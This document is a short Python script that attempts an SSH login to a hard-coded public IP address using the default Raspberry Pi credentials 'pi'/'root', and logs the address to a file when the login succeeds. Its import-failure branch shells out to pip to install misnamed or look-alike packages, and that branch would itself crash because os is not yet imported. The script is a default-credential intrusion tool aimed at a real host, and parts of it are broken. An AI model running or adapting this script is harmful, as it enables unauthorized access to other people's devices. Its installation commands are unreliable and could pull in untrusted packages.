try:
  import random
  import os
  import time
  import socket
  import threading
  import struct
  import ssl
  import paramiko
  import requests
  from multiprocessing import Process
  from contextlib import closing
  from paramiko import client
except ImportError:
#     pip3 install tkinter random requests os time socket threadinf struct time ssl contexlib multiprocessing")
      os.system("pip install random2")
      os.system("pip3 install python-time")
      os.system("pip3 install sockets")
      os.system("pip3 install threaded")
      os.system("pip3 install thread6")
      os.system("pip install supyr-struct")
      os.system("pip install ssl")
      os.system("pip install requests")
      os.system("pip install contextlib2")
      os.system("pip install multiprocessing")
      os.system("pip install subprocess")
      os.system("pip install paramiko")

def check():
                  #ip = "192.168.0.151"
                  ip = "177.230.242.18"
                  ssh = paramiko.SSHClient()
                  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  try:
                       if ssh.connect(ip, username="pi", password="root", timeout=5,allow_agent=False,look_for_keys=False,banner_timeout=200) == None:
                           print(ip, file=open("ip,txt", "a"))
                       else:
                           input("nahh")

                  except Exception as e:
                      input(e)

check()